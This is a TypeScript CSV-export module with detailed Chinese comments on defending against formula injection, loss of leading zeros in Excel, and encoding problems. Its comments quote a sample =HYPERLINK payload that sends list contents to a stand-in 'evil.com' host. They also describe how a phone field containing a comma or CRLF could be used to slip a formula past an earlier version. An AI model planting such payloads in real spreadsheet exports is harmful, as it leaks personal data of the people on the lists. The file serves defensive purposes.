/**
 * CSV 產生 —— 三個「不做就會出事，但沒有任何測試會自己抓到」的問題。
 *
 * 搬自快樂手 apps/web/lib/admin/csv.ts。那一份已經在正式站上跑了一年，三條紀律
 * 每一條都對應一次真的發生過的事故，所以這裡逐條保留，只改一件事（見檔尾）。
 *
 * ── 1. CSV injection ────────────────────────────────────────────────────────
 * 值若以 `=` `+` `-` `@` 開頭，Excel／Google Sheets 會把它當成**公式執行**。
 * 參加者的姓名是使用者輸入的，所以
 *
 *     =HYPERLINK("http://evil.com?"&A1,"點我")
 *
 * 這種東西會在店員打開簽到表的那一秒真的跑起來，而且第一格參數就是隔壁欄的
 * 內容 —— 也就是名單本身。前面補一個單引號讓它變回純文字。
 *
 * `\t` 與 `\r` 也在名單裡：某些版本的 Excel 會把以它們開頭的儲存格重新解析。
 *
 * ── 2. Excel 吃掉開頭的 0 ───────────────────────────────────────────────────
 * `0912345678` 被當成數字，開檔就變成 `912345678`，客服照著打會打不通。
 * 訂單編號 `IB-202600000001` 也會被猜成運算式。兩者都包成 `="…"` 強制文字。
 *
 * ⚠️ **forceText 與前置單引號只能擇一。** 兩個一起用會產生 `="'0912…"`，那個
 *    單引號會在儲存格裡**看得見** —— 隱形的文字標記只在裸值前面才有效。快樂手
 *    的 csv.ts:30-33 特別註解過這一條，因為它是實際踩過的坑。
 *
 * ── 3. UTF-8 中文亂碼 ───────────────────────────────────────────────────────
 * Excel 不看 charset，只看 BOM。沒有 BOM 的話「王小明」會變成一堆問號。
 * 換行一律用 CRLF（RFC 4180）—— Excel 對純 LF 的相容性不穩。
 *
 * ── 這個檔案與快樂手唯一的差別 ──────────────────────────────────────────
 * 快樂手還有 `csvContentDisposition()` 與 `CSV_CONTENT_TYPE`，因為它的 CSV 是一條
 * HTTP 路由。這裡**沒有那兩個東西**，而且不可以有：小時光的 CSV 是一支回傳字串的
 * server fn，檔名由瀏覽器端的 Blob 下載決定。理由寫在
 * src/lib/admin/fns/event-registrations.ts 的檔頭。
 *
 * ⚠️ 這個檔案是純函式，**沒有 server-only**：selftest 直接 import 它來驗
 *    csvCell("=1+1") 的結果，而那才是「production 真正用的那一份」。
 */

/** 會被 Excel／Sheets 當成公式開頭的字元。 */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * 單一儲存格的逸出。
 *
 * @param opts.forceText 電話、訂單編號這類「看起來像數字但不是」的欄位。
 */
export function csvCell(value: unknown, opts: { forceText?: boolean } = {}): string {
  if (value === null || value === undefined) return "";
  const s = String(value);

  // ── 兩步，而且第二步兩條路共用 ────────────────────────────────────────────
  //
  // 步驟一決定「這一格的內容是什麼」，步驟二決定「要不要包 CSV 引號」。
  //
  // ⚠️ 這兩件事一定要分開，而且包引號那一步**不可以只做在其中一條路上**。
  //    快樂手的版本（與這個檔案的第一版）是 forceText 直接 `return`，跳過了包引號
  //    那一步 —— 於是 `="0900000000,=1+1"` 這個欄位在 CSV 裡沒有被引號包住，
  //    RFC 4180 的解析器（Excel 就是）看到的第一個字元是 `=` 不是 `"`，所以那個
  //    引號只是普通字元，**中間的逗號仍然是欄位分隔符**。實測結果：
  //
  //      一列 7 欄變成 8 欄，而第 4 格是 `=1+1"` —— 以 = 開頭，公式照樣執行。
  //      值裡放 CRLF 更直接：一列被切成兩列，第二列開頭就是 `=1+1"`。
  //
  //    也就是說「擋公式」這條紀律在**唯一一個使用者真的控制得了的 forceText 欄位
  //    （電話）**上完全失效。參加者的電話目前在 server 端沒有格式驗證
  //    （src/lib/checkout.ts 的 checkoutItemSchema 只有 .max(30)），所以這不是理論
  //    問題：買一個名額並付款，就能讓店員打開簽到表時執行公式。
  const cell = opts.forceText
    ? // ="…" 本身就已經讓 Excel 當成文字了，不需要也**不可以**再加公式前綴的
      // 單引號 —— 兩個一起用會變成 ="'0912…"，那個單引號在儲存格裡看得見
      //（見檔頭第 2 點）。這裡換掉的是內層引號的逸出，不是公式防護。
      `="${s.replace(/"/g, '""')}"`
    : // 擋公式。順序在引號包裝之前 —— 反過來的話單引號會被包進引號裡失去效果。
      FORMULA_PREFIXES.some((p) => s.startsWith(p))
      ? `'${s}`
      : s;

  // 步驟二。forceText 的輸出一定含有引號，所以它一定會走到這裡被包起來 ——
  // `="0912345678"` 變成 `"=""0912345678"""`。Excel 先解 CSV 引號、再判斷公式，
  // 所以「強制文字」的效果一個字都沒變，而欄位再也切不開。
  if (/[",\r\n]/.test(cell)) return `"${cell.replace(/"/g, '""')}"`;
  return cell;
}

export type CsvColumn<T> = {
  header: string;
  value: (row: T) => unknown;
  /** 電話、訂單編號這類開頭可能是 0 或會被猜成日期的欄位。 */
  forceText?: boolean;
};

/** 一整份 CSV。開頭是 BOM，換行是 CRLF，兩者都是為了 Excel。 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const lines: string[] = [];
  lines.push(columns.map((c) => csvCell(c.header)).join(","));
  for (const row of rows) {
    lines.push(columns.map((c) => csvCell(c.value(row), { forceText: c.forceText })).join(","));
  }
  return `﻿${lines.join("\r\n")}\r\n`;
}
